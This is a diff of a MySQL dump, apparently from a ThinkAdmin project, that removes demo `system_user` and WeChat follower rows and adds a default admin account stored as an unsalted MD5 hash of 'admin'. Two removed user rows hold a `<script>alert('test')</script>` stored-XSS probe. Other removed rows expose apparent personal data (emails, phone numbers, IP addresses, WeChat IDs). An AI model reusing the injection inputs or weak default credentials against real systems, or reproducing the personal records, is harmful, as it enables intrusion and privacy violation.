-INSERT INTO `system_user` VALUES (10100, 'hehehe', 'ffe553694f5096471590343432359e02', 'dffddf', '', ',118,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-19 08:54:42');
-INSERT INTO `system_user` VALUES (10101, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test', 'https://v6.thinkadmin.top/upload/df/1de0b04c1d4000ceb01cfca5e5ed2f.jpg', ',118,117,114,', '', '393210556@qq.com', '18706714372', '', '', 0, '', 0, 0, 1, '2020-11-20 13:24:40');
-INSERT INTO `system_user` VALUES (10102, '1111111', '7fa8282ad93047a4d6fe6111c93b308a', '32323232', '', ',121,', '232323', '32@qq.com', '13899999999', '', '', 0, '32323', 0, 0, 1, '2020-11-26 10:01:06');
-INSERT INTO `system_user` VALUES (10103, 'test123', 'cc03e747a6afbbcbf8be7668acfebee5', 'test', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-27 00:22:07');
-INSERT INTO `system_user` VALUES (10104, 'test11', 'f696282aa4cd4f614aa995190cf442fe', 'sss', '', ',,', '', '', '', '', '', 0, '<script>alert(\'test\')</script>', 0, 0, 1, '2020-11-27 00:23:44');
-INSERT INTO `system_user` VALUES (10105, 'test520', '228c12267eeba23264ee772957f9707a', '<script>alert(\'test\')</script>', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-27 00:27:23');
-INSERT INTO `system_user` VALUES (10106, 'admin1', 'e00cf25ad42683b3df678c61f42c6bda', 'admin1', '', ',122,121,119,117,114,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-28 00:22:14');
-INSERT INTO `system_user` VALUES (10107, '123456', 'e10adc3949ba59abbe56e057f20f883e', '123', '', ',121,119,117,114,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-30 14:23:01');
-INSERT INTO `system_user` VALUES (10108, '12345', '827ccb0eea8a706c4c34a16891f84e7b', '12345', '', ',121,119,117,114,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-11-30 14:24:56');
-INSERT INTO `system_user` VALUES (10109, '321321', '3d186804534370c3c817db0563f0e461', '21321', '', ',114,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-12-03 08:28:37');
-INSERT INTO `system_user` VALUES (10110, 'haha', '4e4d6c332b6fe62a63afe56171fd3725', '哈哈', 'https://v6.thinkadmin.top/upload/d4/1d8cd98f00b204e9800998ecf8427e.png', ',126,', '', '', '', '', '', 0, 'abc1', 0, 0, 1, '2020-12-03 17:45:03');
-INSERT INTO `system_user` VALUES (10111, 'he4966', 'dc12f5a7b4bd1f8a0ae4ab9ecad7aea8', 'he4966', 'https://v6.thinkadmin.top/upload/d0/289dc0a46fc5b15b3363ffa78cf6c7.png', ',,', '496631085', 'he4966@qq.com', '14966310850', '61.140.237.93', '2020-12-24 14:09:51', 1, 'he4966.cn/1.html', 0, 0, 1, '2020-12-11 08:58:32');
-INSERT INTO `system_user` VALUES (10112, 'aaaaa', '594f803b380a41396ed63dca39503542', 'aaaaa', '', ',129,128,127,126,121,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-12-13 14:56:06');
-INSERT INTO `system_user` VALUES (10113, 'qweqwe', 'efe6398127928f1b2e9ef3207fb82663', 'qweqwe', '', ',,', '', '', '', '', '', 0, 'qwe', 0, 0, 1, '2020-12-14 01:55:34');
-INSERT INTO `system_user` VALUES (10114, 'hh0924', '60658acfcedc00050f8324cb2605b42b', 'hh0924', 'https://v6.thinkadmin.top/upload/6a/9385adf850d0eb8d668b639ff7d98f.jpg', ',129,128,127,126,121,', '', '', '', '', '', 0, '', 0, 0, 1, '2020-12-25 16:46:32');
-INSERT INTO `system_user` VALUES (10115, 'test', '098f6bcd4621d373cade4e832627b4f6', 'teast', 'https://v6.thinkadmin.top/upload/25/e9c92266d3b7ab86d3221b0c9305fe.jpg', ',2,', '', '', '', '116.232.192.115', '2021-01-07 14:38:41', 6, '', 0, 0, 1, '2020-12-26 17:05:30');
-INSERT INTO `system_user` VALUES (10116, 'test123', 'cc03e747a6afbbcbf8be7668acfebee5', '测试', 'https://v6.thinkadmin.top/upload/25/e9c92266d3b7ab86d3221b0c9305fe.jpg', ',2,', '', '', '', '114.245.182.97', '2021-01-13 11:46:15', 4, '', 0, 0, 1, '2021-01-08 10:55:07');
-INSERT INTO `system_user` VALUES (10117, 'yjwyjw', 'fad157c6d841a39f98d6a1a9c25bcf72', 'yjw', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2021-01-19 18:25:20');
-INSERT INTO `system_user` VALUES (10118, '5432', '2e92962c0b6996add9517e4242ea9bdc', '345', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2021-01-20 15:34:03');
-INSERT INTO `system_user` VALUES (10119, 'hhjx', '568007e5d30828a4469feb4f03cf1843', 'hhz', '', ',3,', '', '', '', '58.42.244.68', '2021-01-21 17:51:41', 3, '', 0, 0, 1, '2021-01-21 17:45:25');
-INSERT INTO `system_user` VALUES (10120, '1111', 'b59c67bf196a4758191e42f76670ceba', '2222', '', ',,', '', '', '', '', '', 0, '', 0, 0, 1, '2021-01-22 13:50:03');
-INSERT INTO `system_user` VALUES (10121, 'shang', '8379c86250c50c0537999a6576e18aa7', 'shang', '', ',3,2,', '', '', '', '', '', 0, '', 0, 0, 1, '2021-01-25 14:09:05');
-INSERT INTO `system_user` VALUES (10122, 'test', '098f6bcd4621d373cade4e832627b4f6', 'test', '', ',7,', '', '', '', '115.60.131.241', '2021-02-02 16:14:04', 2, '', 0, 0, 1, '2021-02-02 15:08:41');
-INSERT INTO `system_user` VALUES (10123, 'oooooo', '9982b2a7fceaaee2c8444b5086aee008', '321', '', ',13,10,', '3123123122', '123@qq.com', '18888888888', '', '', 0, '', 1, 0, 0, '2021-02-22 11:26:50');
+INSERT INTO `system_user` VALUES (10000, 'admin', '21232f297a57a5a743894a0e4a801fc3', '系统管理员', 'http://127.0.0.1:8000/upload/cf/d4b538dc1d8b96a09310cab5fa44c9.gif', ',,', '', '', '', '127.0.0.1', '2021-02-24 08:48:12', 78, '', 1, 0, 0, '2015-11-13 15:14:22');
 
 -- ----------------------------
 -- Table structure for wechat_fans
@@ -5992,426 +4861,11 @@ CREATE TABLE `wechat_fans`  (
   INDEX `index_wechat_fans_unionid`(`unionid`) USING BTREE,
   INDEX `index_wechat_fans_isblack`(`is_black`) USING BTREE,
   INDEX `index_wechat_fans_subscribe`(`subscribe`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 426 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-粉丝' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-粉丝' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_fans
 -- ----------------------------
-INSERT INTO `wechat_fans` VALUES (1, 'wx60a43dd8161666d4', 'oGsrks90f4Q9AtYh7qEl7zOq9714', 'o38gpsyv_0ZMf036Y34MyxWe3N94', ',,', 0, 1, '小森℡¹³⁰⁵⁶⁶⁹²³²⁰', 1, '中国', '四川', '成都', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLDwoNDf4JibY83km94sePmib8icWnanYRflQHoaEW8P1baROqBBAsVvPBSdJRmskBVCWA6q2Z6rywgeA/132', 1554367956, '2019-04-04 16:52:36', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (2, 'wx60a43dd8161666d4', 'oGsrks681jIO4LFqxj_9kglhVhR8', 'o38gps_QjMGBd-4V23YtnbY0IJLg', ',,', 0, 1, 'Ora', 1, '冰岛', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLDicK5ePRgq06HcghPxr8Wg2KmcmotIOaGAMEEUgmricAdbXYQPtNcibDibBC7dfhpFrEHJaOAeAqkcyA/132', 1572078534, '2019-10-26 16:28:54', '', 'ADD_SCENE_QR_CODE', '0', '你好', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (3, 'wx60a43dd8161666d4', 'oGsrks5iFPe4nVA4wsbHDeaz460Q', 'o38gps84njUZvxV-CpsvR3_VT3ko', ',,', 0, 1, '山东小木', 1, '中国', '山东', '东营', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaEJxymiaTy2dEDW40SPlACqYEQskichFEGCxc6zFNVt7VjbMl5wnMeqnyzuy0lItTtxic9s324P54wyEg/132', 1565101271, '2019-08-06 22:21:11', '', 'ADD_SCENE_QR_CODE', '0', '111abc', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (4, 'wx60a43dd8161666d4', 'oGsrks1qovmJUGycmiAKSry3ISp4', 'o38gps4pJjHGkXVGe1aXxgzKJ7u4', ',,', 0, 1, '黑不溜秋🐾', 1, '中国', '贵州', '贵阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFkzMmUKxtqiafIDXib9Lqm5oVA1ibiakiaYSBPRZ04gyeWBibsEV1rmHBn1s3HIH4FIBJWBoLqpp2kMFH7g/132', 1517301228, '2018-01-30 16:33:48', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (5, 'wx60a43dd8161666d4', 'oGsrks9XUFq6O6g2len8l2TaS6dA', 'o38gps5khVMMG2trfekmkNX13VOI', ',2,', 0, 1, '许成哲', 1, '中国', '福建', '厦门', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLAMQn9cXnRr8mVEgicJU7ktibJMZXQMqAKBCSj5Md9PX8kBibnPCic6XFxCqyXNjhV7zxEWMFlnwK195A/132', 1497508654, '2017-06-15 14:37:34', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (6, 'wx60a43dd8161666d4', 'oGsrks5LPIyKW5DhKIlbwup7ttsY', 'o38gps5_GtNBpRCAC4xi_1zThFxY', ',,', 0, 1, 'Jack Li', 1, '中国', '广东', '深圳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0uneic3BIpbrdSp91Dcl46Qwkicib3yaSxLZhStia6SlM3ccRyek1toJ57yhAWOHsbD1Z46scwZTlongbn/132', 1576594459, '2019-12-17 22:54:19', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (7, 'wx60a43dd8161666d4', 'oGsrkswZ9aRbMxNeADBiIoFs7Ixs', 'o38gps5cxg7TIJjhW40hcfx3ceM0', ',,', 0, 1, '大豪', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichAgPGia3yWJjWELUkZB1ZeNLiaA5FUtiaicc4t1nicDW8j7bllJVnAlKNYOD3hrXiaricadxuzTUveqIghR/132', 1501054131, '2017-07-26 15:28:51', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (8, 'wx60a43dd8161666d4', 'oGsrks3wmXGbNTdXziL3B9yqk2LQ', 'o38gpsxJ19rGKqndlBWudPyfiVPI', ',,', 0, 1, '陌安Sir', 1, '中国', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnjW8fFhqjtaziay4puvq61xhViaQrJUicaFVvJicLjpSBQerd68U0o4Nib20Xsvm5ZjPuMLcty3sPuIicicg/132', 1580373088, '2020-01-30 16:31:28', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (9, 'wx60a43dd8161666d4', 'oGsrks7m6YxqJr-uVgyB_ehp-3_M', 'o38gps-X1CXwQCpvE5_Suv5Fa1GA', ',2,241,', 0, 1, '白凤鸣', 1, '中国', '黑龙江', '哈尔滨', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/Q3auHgzwzM7yicibbXmOnrTS6T1DNp2d1taxD5lEVyRjvwIkB2RzeYv5zbicB1n7yIE1mWvvHs2ALU4EfYNIDaPbw/132', 1536743322, '2018-09-12 17:08:42', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (10, 'wx60a43dd8161666d4', 'oGsrkszCVFA8v-3_FGYhmTRiURlc', 'o38gpsza67FfLSapYrfBTo1Zu5zw', ',,', 0, 1, '杨永安', 1, '中国', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFlqFUCaneic7zQBqwRxBSrXhMJeibuUZ7ia0ibhnR2YiaYHELquBcsjlQKkAw3w8fwEe2OzazNmSHIb7lrwJ1cIKLKEj/132', 1514250857, '2017-12-26 09:14:17', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (11, 'wx60a43dd8161666d4', 'oGsrks2d7Vj8sqMh8A5RV19_gJqw', 'o38gps7Xb4ksNPSnNlVkagiVmrGM', ',,', 0, 1, 'CGGO.', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mkKSyWyia8EEu1g1fcjgHTibDIXAwBwib0qzfY7pMePkIyGjSpcER5vA0EmaiczULwdwga77QztEOrrWJGB6SordSZ/132', 1525858013, '2018-05-09 17:26:53', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (12, 'wx60a43dd8161666d4', 'oGsrks8FUHqgI4nOt8JJP8qd8ioE', 'o38gps7jMkHnBSV6JN-Rpgog6lu0', ',,', 0, 1, '日尧', 1, '中国', '浙江', '杭州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaEJEJhTmyr45OJJJInEVwQcc95lt90IrRhPQX3LoQ55o7iamGytWnicL7PHreWxicQlhrrocDDWKtKm4g/132', 1476402502, '2016-10-14 07:48:22', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (13, 'wx60a43dd8161666d4', 'oGsrks6HNhd5IgQBd4Wfe1j0lY-Y', 'o38gps1wvTeJLKirFf4UFMp4hIwY', ',,', 0, 1, '贤', 1, '中国', '湖北', '武汉', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLBpTVfzmuclcLnY6MutHIA7420yRicZvc2qUHqVMBib1geLCqut1Uy40Vwc81Ba15cBqhROicZBckQ0A/132', 1570970192, '2019-10-13 20:36:32', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (14, 'wx60a43dd8161666d4', 'oGsrks2Mv-0flhVG8Oi-bZZSdRFE', 'o38gps1COGG9--oRbPIazGFPmtcE', ',2,', 0, 1, 'UC', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnjFHIKUiabCChlvlBvNO4ItvQANPqmdKRIoDJTXm56vaS6aC1sMvFskQV7uVTMmBQYDWBuoRGzIb11OiaMaiasqGIic/132', 1466066875, '2016-06-16 16:47:55', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (15, 'wx60a43dd8161666d4', 'oGsrks5PzhNfMRmV1E5dL6Ydsm4A', 'o38gps9lnht0uxYR6cTlnntT6bA0', ',,', 0, 1, '_Xiαпg™', 1, '中国', '广东', '深圳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mkKSyWyia8EEvwt23OaKQmcibicbzKmyDHP8HNeHEHqc552NUtZeoTZ4PhBNYWvYyae5WeSa6KRoq4gtwciamjI9DI/132', 1496038821, '2017-05-29 14:20:21', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (16, 'wx60a43dd8161666d4', 'oGsrks9Sl2pcIhFCLoXBwxFi5P8w', 'o38gps2DCEuBJkh-5i9kGg7lxNsE', ',,', 0, 1, '在路上', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmyWVLyT5ZdM1WWBicr9vxDM131kibTTm9hlDKXB7iahlM6FKiagkmLdB036g6EJ0wRqWicgo1nMlic9WDg/132', 1496907572, '2017-06-08 15:39:32', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (17, 'wx60a43dd8161666d4', 'oGsrkszQdIxogHKGhWQOUl41B_yI', 'o38gpsxwYSL2_sAsMZBfIuZZksL8', ',,', 0, 1, '明仔', 1, '中国', '福建', '福州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLATa6gplf8VO1SwibmEQdxgc0Kicer48xNzicBiaLIwGMcA537df6U1ClBb9Q3psdJriaTFdefyaKlmUdQ/132', 1579313416, '2020-01-18 10:10:16', '', 'ADD_SCENE_QR_CODE', '0', '菜单回复', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (18, 'wx60a43dd8161666d4', 'oGsrks7bq2oijI9rA38zZ1KxTHyA', 'o38gps1-O1OEFn6Fle0jQGoDuDdg', ',,', 0, 1, '无形…', 1, '中国', '四川', '成都', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFlqFUCaneic7zYBL9qFNibfCSyyTxQfRwlmYGE7EL54lHJ6DbuWUqfbvTLnWqiaMYzGSiatDNqwKwuE2z1OLKygepqe/132', 1510799509, '2017-11-16 10:31:49', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (19, 'wx60a43dd8161666d4', 'oGsrks68g1elLyggOA9wUXezjkVY', 'o38gps-clgtfbM1BjVHTV7OdQTiY', ',,', 0, 1, '瓦力', 1, '中国', '河南', '洛阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaELUzO65C5B5bfto6Oq7PGP6EVSMwzt73avvkvoZhz6sg28SMiadEZB5BpiaSAASWmIdkIZNYpN6nusA/132', 1498804317, '2017-06-30 14:31:57', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (20, 'wx60a43dd8161666d4', 'oGsrks7Zy-PKQl6VKUV1smUu5gZo', 'o38gps-JsF4vEs2myjLQUcsPeIps', ',,', 0, 1, '王涛', 1, '中国', '新疆', '乌鲁木齐', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLAicsazEXfYGIiaUgLIicFt0BPpLyHWk9VT7mkQE0xTz6wrz2icibBgg6InwT83icoGCZ516TSqVXkPBlrw/132', 1599728060, '2020-09-10 16:54:20', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (21, 'wx60a43dd8161666d4', 'oGsrks9f-NoY4hvqev-Nulbsigb8', 'o38gps9iZQgkyXPaHl-N7aBSXYv4', ',,', 0, 1, '红松鼠', 1, '中国', '四川', '成都', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaELAcT3c5Gyhsicw9dYzlVtIKJk1E15YSNj3WM7RsPDU0sCGXSGZ91lOhv0dueGbBRuuSrPIAYMzxiaA/132', 1544693570, '2018-12-13 17:32:50', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (22, 'wx60a43dd8161666d4', 'oGsrks-mJu7hqiRMhNDPVGR0Fu9o', 'o38gpszLGFY86inXygfs3klN5QMI', ',2,', 0, 1, '叫我小周-18922325497', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLCFOsVf6CdF2O7VicDsmWPTibTtyT7L8TH4bQthUuUhJZdrBczhI8DYao7Q5859g7yAmsubMTEsmfkg/132', 1461314119, '2016-04-22 16:35:19', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (23, 'wx60a43dd8161666d4', 'oGsrks9wr0__6pq26qnyHZF4OSF0', 'o38gps8VtceLYgD9tuB0QjXAs4zc', ',,', 0, 1, 'MIGUMALL', 1, '中国', '上海', '松江', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnjFHIKUiabCChrDQdmA8DntV1yBc4yn3Dx2vosibcSSFiavDuU6qZ37wYiaKArafiafSgVmtewiaVUcuwYpStBLIuVuKa/132', 1579444164, '2020-01-19 22:29:24', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (24, 'wx60a43dd8161666d4', 'oGsrks0Q0Q5WAT-aSKHuJsmXjojU', 'o38gps_d4aGPEpf6eyRH73SAuCuY', ',,', 0, 1, '宝典', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mkKSyWyia8EEquArYSyUgT9dHEUBrFMvuUVWTAQMVcTp43oX62H8w4icWMSTBhmLGh0hdj0KhuCI08TZnWulYoBu/132', 1501207299, '2017-07-28 10:01:39', '', 'ADD_SCENE_PROFILE_CARD', '0', '', '2021-01-08 13:47:43');
-INSERT INTO `wechat_fans` VALUES (25, 'wx60a43dd8161666d4', 'oGsrks-h2mrLJJge7Xjm7lvqmY7Q', 'o38gps9Fudsconvbbbe4V4CVRdiE', ',,', 0, 1, 'Star', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/IJUabwp91sARG2UdhI5pMZINgcWu0fBky1iasdwbQicDBmEavMeSicvOPO7icbvIibgr91ua0ub2uW3AvUTeu4aR8b25UhpgZ3oqs/132', 1543571671, '2018-11-30 17:54:31', '', 'ADD_SCENE_PROFILE_CARD', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (26, 'wx60a43dd8161666d4', 'oGsrks6MdHVQC87MqEKpFSNDJlFw', 'o38gps_8KRAfvQe8C6oMD-U82jKA', ',,', 0, 1, 'La🇨🇦', 1, '不丹', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaEIHVyPlN3ypIhRkQItGPR6ftHPoJfkBU2kgsAaIAjWia9hoRPicJqI30akn599CZXq7xdKu2XG9jBsw/132', 1521186882, '2018-03-16 15:54:42', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (27, 'wx60a43dd8161666d4', 'oGsrks-uhJW3zzVI37jJUxgLL8EI', 'o38gps5SyrkvcANPtnpc-cEXecz0', ',,', 0, 1, 'Rena🧸', 1, '中国', '上海', '浦东新区', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/Q3auHgzwzM6QJ33G0al5CKick3SDvIbE3A0J0ndDdibE2yJxYmIT9xchchxcrmz0ezKlibYkUzUDicfKqZVOY8G0GA/132', 1554704844, '2019-04-08 14:27:24', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (28, 'wx60a43dd8161666d4', 'oGsrks331xJKDL9KOGrsMJHH_5bg', 'o38gps0Us16ZqwbpXVcgHL1IjLQg', ',,', 0, 1, 'lovely', 1, '中国', '黑龙江', '齐齐哈尔', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLBxECee3sZYmkhdFT3qBzreiaEiaGxbp2ib6O71nicctFWnmzbwGjpwx7oiaicVNlH1CQNQnKQG7x1XKic8w/132', 1604491286, '2020-11-04 20:01:26', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (29, 'wx60a43dd8161666d4', 'oGsrks7Owr4aGpQeCNcZEIdhdEdM', 'o38gpsx-W33xl7IpokJmVYFlsqmg', ',,', 0, 1, 'ㅤ', 1, '安道尔', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaEIjZJugquHONrrt5XzxsVTeyNzhAxnic1V1myx3icBCsqa8Il3FvBjdiagzsibZueE1WFjomW6DTfNLaQ/132', 1564641353, '2019-08-01 14:35:53', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (30, 'wx60a43dd8161666d4', 'oGsrks9lB3XDAhfkEOkWqMEMexWM', 'o38gpswjDBH4kpjgACyEImkDuQoU', ',,', 1, 1, '　＂Patienceヾ', 1, '中国', '湖北', '武汉', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaELziavRnvOsd4KQdC41uXnzbRWiaiaWvUJncgAg6icDxuDJGSiao7EpCEeSQFZyDTQxuxlJf2cCF5fcYJQ/132', 1606963381, '2020-12-03 10:43:01', '', 'ADD_SCENE_QR_CODE', '0', '啊', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (31, 'wx60a43dd8161666d4', 'oGsrksx3AUPGik0A5YJLgCU0xXuQ', 'o38gps_QUHkrw6GI-fAU12UfDYv8', ',,', 0, 1, '范竞', 1, '中国', '陕西', '西安', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFkWic3UVOkFGFiaoGryGkTtOQ28mzaxibtfpuHVibicqia3bL6XOp4iaJjGtSFG6nSbc7quCWbVGbicQUeIJA/132', 1564811667, '2019-08-03 13:54:27', '', 'ADD_SCENE_QR_CODE', '0', '111', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (32, 'wx60a43dd8161666d4', 'oGsrksyP1ZaV6OIby6lFhVevmfWA', 'o38gps_MkgPH3Ewn8BYz3MOomOaU', ',,', 0, 1, 'Mr.Zou', 1, '中国', '重庆', '巴南', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1n4RY2fIzPicq7s9WpbhiaCHGKWRV9iaZPlzRwWHWmnFZoZLQDOrWJlkktqaZ6VOoghxvC8c9BSDSyzw/132', 1545026380, '2018-12-17 13:59:40', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (33, 'wx60a43dd8161666d4', 'oGsrkswOwBceFOvE7xVF7K54ClYg', 'o38gps51ilcgTbQ9zcuCJb_qCSk0', ',,', 0, 1, 'YE', 1, 'AE', 'Ajman', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLDDYpvHetPwvkK12ob1e5Abmg7wnnNr8OFB2gEWMZrqyC0sujmMMyxfibHYDoGJSrO0BjFPpB716IQ/132', 1582780413, '2020-02-27 13:13:33', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (34, 'wx60a43dd8161666d4', 'oGsrks9gfg7nLP0G7sdTlq4xfzpU', 'o38gps8YeMGMWqMecWQjOko6aWAk', ',,', 0, 1, '张鹤', 1, '中国', '北京', '顺义', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1kOAqzeAicameS9ZWMDK4awMxkUsnDzeB8TpVc9qMpYL9mEQCciaegSqiaBobibvpjBUN67YyBk8PCKlQ/132', 1567147167, '2019-08-30 14:39:27', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (35, 'wx60a43dd8161666d4', 'oGsrks1_4lRQum_CKGWAVsDZxYps', 'o38gps33cPD8u2cxNx5evYBYIVs8', ',,', 0, 1, 'Cricle', 1, '中国', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLBia7xaYiafnETkiczAxjqJsAuyEiapPbjcEFqO3HWtPC2Ekny5jY1Dq8dPCLDRZGFoxBy1ELOia1hLkDg/132', 1520303270, '2018-03-06 10:27:50', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (36, 'wx60a43dd8161666d4', 'oGsrksyzfRggTv9aph8a-dy9TcdI', 'o38gpsxP5fii5BQtI20Gvj4cAELY', ',,', 0, 1, 'Amos', 1, '中国', '重庆', '南岸', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1lddYMJiaYuFmeP8Q3CtibuQVDyY3Bvj0biceYcicadP99tLr6LSnnM3MzlFBUeibaK0LBaia6e9e0PYMvQ/132', 1528360545, '2018-06-07 16:35:45', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (37, 'wx60a43dd8161666d4', 'oGsrks1B3vQDh5xduPwbxWJxAKc4', 'o38gpsymO8y7VPxJ2MIXFyNTfF8U', ',,', 0, 1, '皮皮', 1, '中国', '河北', '邢台', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1l6e0x2dj3TPEXqCazjPicoA7GV3iclwVfGOUpxrgXqwUGF5sFzk1jUGIpR1C9aFRsNEicwZeIqSqaAg/132', 1603552046, '2020-10-24 23:07:26', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
